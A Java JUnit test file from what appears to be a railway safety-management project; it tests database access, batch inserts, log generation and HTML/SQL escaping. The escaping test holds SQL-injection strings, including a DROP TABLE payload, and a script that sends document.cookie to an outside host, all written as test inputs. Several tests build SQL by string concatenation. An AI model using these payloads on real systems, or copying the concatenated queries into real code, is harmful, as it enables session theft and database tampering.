import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.apache.commons.io.FileUtils;
import org.apache.commons.lang.StringEscapeUtils;
import org.hibernate.Session;
import org.hibernate.transform.Transformers;
import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TestName;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.orm.hibernate3.HibernateTemplate;
import org.springframework.web.util.HtmlUtils;

import com.alibaba.fastjson.JSONObject;
import com.zondy.database.dao.BaseDAOImpl;
import com.zondy.hibernate.bean.FhyVo;
import com.zondy.hibernate.dao.HibernateDAOImpl;
import com.zondy.listener.ApplicationListener;
import com.zondy.service.impl.FhyScoreImpl;
import com.zondy.util.DateUtils;
import com.zondy.util.RandomUtils;

/**   
 * 特别声明：本技术材料受《中华人民共和国着作权法》、《计算机软件保护条例》
 * 等法律、法规、行政规章以及有关国际条约的保护，武汉中地数码科技有限公
 * 司享有知识产权、保留一切权利并视其为技术秘密。未经本公司书面许可，任何人
 * 不得擅自（包括但不限于：以非法的方式复制、传播、展示、镜像、上载、下载）使
 * 用，不得向第三方泄露、透露、披露。否则，本公司将依法追究侵权者的法律责任。
 * 特此声明！
 * 
   Copyright (c) 2013,武汉中地数码科技有限公司
 */

/**
 * 该文件详细功能描述
 * @author 雷志强
 * @version 1.0
 */
public class UnitTest {
	
	private static long startTime = 0L;
	private static long endTime = 0L;
	private static JSONObject json = null;
	
	@Rule
	public TestName name = new TestName();
	
	@Before
	public void beforeUnitTest(){
		startTime = System.currentTimeMillis();
	}
	
	@After
	public void afterUnitTest(){
		endTime = System.currentTimeMillis();
		System.out.println("method="+name.getMethodName());
		System.out.println("result="+json);
		System.out.println("exetime="+(endTime - startTime)+"ms");
	}
	
	@Test
	public void testLogger(){
		Logger logger = LoggerFactory.getLogger(UnitTest.class);
		logger.info("这是一条信息{}","aaaaaa");
	}
	
	@Test
	public void testHibernateTemplate(){
		System.out.println("OK");
		ApplicationContext ctx = new ClassPathXmlApplicationContext("applicationContext.xml");
		System.out.println(ctx);
		HibernateTemplate template = (HibernateTemplate)ctx.getBean("hibernateTemplate");
		BaseDAOImpl dao = new BaseDAOImpl();
		dao.setMyHibernateTemplate(template);
		List list = dao.listAll("select * from T_USER");
		System.out.println(list);
//		List list = dao.listAll("select * from T_DIC t");
//		System.out.println(list);
//		String string = "人身安全|防护员岗位|施工管理|干部（工班长）管理|消防安全|交通安全|自轮运转设备管理|探伤作业|道口工管理|巡道（检）人员管理";
//		String[] tArr = string.split("[|]");
//		String sql = "";
//		for(int i=0;i<tArr.length;i++){
//			String code = (i+1)<10?"0"+(i+1):""+(i+1);
//			sql = "insert into T_DIC(dic_name,dic_type,code,text) values('违章类别','wzlb','wzlb-"+code+"','"+tArr[i]+"')";
//			int ret = dao.saveObject(sql);
//			System.out.println(ret);
//		}
//		Session session = template.getSessionFactory().getCurrentSession();
//		session.beginTransaction();
//		System.out.println(session);
//		String sql = "select * from T_DIC t";
//		List list = session.createSQLQuery(sql).setResultTransformer(Transformers.ALIAS_TO_ENTITY_MAP).list();
//		System.out.println(list);
//		sql = "insert into T_DIC(dic_name,dic_type,code,text) values('违章类别','WZLB','WZLB01','AAAAAA')";
//		int ret = session.createSQLQuery(sql).executeUpdate();
//		System.out.println(ret);
	}
	
	@Test
	public void testJdbcTemplate(){
		System.out.println("OK");
		ApplicationContext ctx = new ClassPathXmlApplicationContext("applicationContext.xml");
		System.out.println(ctx);
		JdbcTemplate template = (JdbcTemplate)ctx.getBean("jdbcTemplate");
		String sql = "select * from tab_user t";
		List list = template.queryForList(sql);
		System.out.println(list);
	}
	
	@Test
	public void testBetchSaveData(){
		System.out.println("OK");
		ApplicationContext ctx = new ClassPathXmlApplicationContext("applicationContext.xml");
		System.out.println(ctx);
		JdbcTemplate template = (JdbcTemplate)ctx.getBean("jdbcTemplate");
		String sql = "insert into zd_dic(id,bm,mc,zdlx,flag) values('','','','province',0)";
		StringBuffer sb = new StringBuffer();
		for(int i = 0;i<10;i++){
			sql = "insert into zd_dic(id,bm,mc,zdlx,flag) values('"+(100+i)+"','"+i+"','字典-"+i+"','province',0);";
			sb.append(sql);
		}
		String sqlsb = sb.toString();
		sqlsb = sqlsb.substring(0,sqlsb.length()-1);
		int[] ints = template.batchUpdate(sqlsb);
		System.out.println(ints);
	}
	
	@Test
	public void testHtmlEncode() throws UnsupportedEncodingException{
		String sql="1' or '1'='1";
		sql = "1' ;drop table t_test;--";
        System.out.println("防SQL注入:"+StringEscapeUtils.escapeSql(sql)); //防SQL注入  
        System.out.println("转义HTML,注意汉字:"+StringEscapeUtils.escapeHtml("<font>chen磊  xing</font>"));    //转义HTML,注意汉字  
        System.out.println("反转义HTML:"+StringEscapeUtils.unescapeHtml("<font>chen磊  xing</font>"));  //反转义HTML  
        System.out.println("转成Unicode编码："+StringEscapeUtils.escapeJava("陈磊兴"));     //转义成Unicode编码  
        System.out.println("转义XML："+StringEscapeUtils.escapeXml("<name>陈磊兴</name>"));   //转义xml  
        System.out.println("反转义XML："+StringEscapeUtils.unescapeXml("<name>陈磊兴</name>"));    //转义xml
		String str = "<script type='text/javascript'>var img = new Image();img.src='http://www.124.com/api?data='+document.cookie+';</script>";
		String string = HtmlUtils.htmlEscape(str);
		System.out.println(string);
	}
	
	@Test
	public void testGetFhy(){
		JSONObject paramJson = new JSONObject();
		paramJson.put("page", 1);
		paramJson.put("rows", 2);
		json = FhyScoreImpl.getFhy(paramJson);
	}
	
	@Test
	public void testImportData(){
		String[] chejian = new String[]{"平林线路车间","随州线路车间","枣阳线路车间","襄阳线路车间","襄阳南线路车间","胡集线路车间","襄北线路车间","陈家湖线路车间","谷城线路车间","武当山线路车间","十堰线路车间","襄阳桥隧车间","武当山桥隧车间","云梦线路车间","轨道车队"};
		String[] gongqu = new String[]{"机捣车工区"};
		
	}
	
	@Test
	public void testImportLogData(){
		Date now = new Date();
		Date date = null;
		int start = 1;
		int end = 3600*24*60;
		String sql = "";
		String[] modeArr = new String[]{"用户登录","防护员管理","违章违纪","全过程监控","数据字典","部门管理","人员管理","角色管理","用户管理"};
		String[] opArr = new String[]{"查询","新增","修改","删除"};
		for(int i=0;i<1000;i++){
			int amount = RandomUtils.getInt(start, end);
			date = DateUtils.calculateBySecond(now, -1*amount);
			String datetime = DateUtils.date2String("yyyy-MM-dd HH:mm:ss", date);
			String mode = modeArr[RandomUtils.getInt(0, modeArr.length-1)];
			String op = opArr[RandomUtils.getInt(0, opArr.length-1)];
			String ip = "192.168.10."+RandomUtils.getInt(10, 250);
			sql = "insert into t_user_oplog(ip,name,username,optype,opcontent,createtime) values('"+ip+"','"+mode+"','admin','"+op+"','','"+datetime+"')";
			ApplicationListener.dao.saveObject(sql);
		}
	}
	
	@Test
	public void test() throws IOException{
		String filepath = "D:/2222.txt";
		List<String> list = FileUtils.readLines(new File(filepath));
		String fields = list.get(0);
		String[] fieldArr = fields.split("[,]");
		List<JSONObject> datalist = new ArrayList<JSONObject>();
		JSONObject record = null;
		String[] dataArr = null;
		for(int i=1;i<list.size();i++){
			dataArr = list.get(i).split("[,]");
			record = new JSONObject();
			for(int k=0;k<fieldArr.length;k++){
				record.put(fieldArr[k].toLowerCase(), dataArr[k]);
			}
			datalist.add(record);
		}
		System.out.println(datalist);
		System.out.println(datalist.size());
		List<JSONObject> list2 = getChildren("0", datalist);
		System.out.println(list2);
	}
	
	public List<JSONObject> getChildren(String pid,List<JSONObject> datalist){
		List<JSONObject> list = new ArrayList<JSONObject>();
		int count = datalist.size();
		JSONObject record = null;
		List<JSONObject> children = null;
		JSONObject child = null;
		String _pid = "";
		String bm = "";
		for(int i=0;i<datalist.size();i++){
			record = datalist.get(i);
			int total = 0;
			int zxcount = 0;
			int bzxcount = 0;
			//System.out.println("record="+record);
			_pid = record.getString("pid");
			bm = record.getString("﻿bm");
			//System.out.println(record);
			//System.out.println(bm+",,"+_pid);
			if(_pid.equals(pid)){
				total += record.getIntValue("total");
				zxcount += record.getIntValue("zxcount");
				bzxcount += record.getIntValue("bzxcount");
				children = getChildren(bm, datalist);
				if(children.size()>0){
					for(int k=0;k<children.size();k++){
						child = children.get(k);
						total += child.getIntValue("total");
						zxcount += child.getIntValue("zxcount");
						bzxcount += child.getIntValue("bzxcount");
					}
				}
				record.put("children", children);
				record.put("total", total);
				record.put("bzxcount", bzxcount);
				record.put("zxcount", zxcount);
				//System.out.println(record);
				list.add(record);
			}
		}
		return list;
	}
	
	@Test
	public void testSaveFhy(){
		System.out.println(ApplicationListener.ctx);
		HibernateDAOImpl dao = new HibernateDAOImpl();
		FhyVo vo = new FhyVo();
		vo.setBh("10003");
		vo.setXm("测试");
		vo.setXb("男");
		vo.setAge(30);
		vo.setCj("襄阳");
		vo.setGq("AAAAA");
		vo.setSjh("15926369822");
		vo.setZzmm("党员");
		vo.setDqfhzg("驻站");
		vo.setCjpxsj("2018-09-12");
		vo.setState(1);
		int ret = dao.saveObject(vo);
		System.out.println(ret);
	}
}
